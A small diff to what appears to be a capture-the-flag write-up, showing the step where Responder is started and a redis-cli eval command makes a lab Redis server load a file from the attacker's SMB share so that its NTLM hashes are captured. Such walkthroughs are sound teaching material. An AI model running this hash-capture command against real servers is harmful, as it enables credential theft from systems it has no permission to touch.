@@ -40,6 +40,7 @@ we got the users.txt flag. If we can get any files why not exploit further to ge
 I set up the responder from impacket, when users from the Redis server try to connect to our machine responder will log the hashes.
 
 `sudo responder -I 10.9.0.31`
+
 `redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0`
 
 ![responder](https://prabinsigdel.com.np/images/responder.jpg)
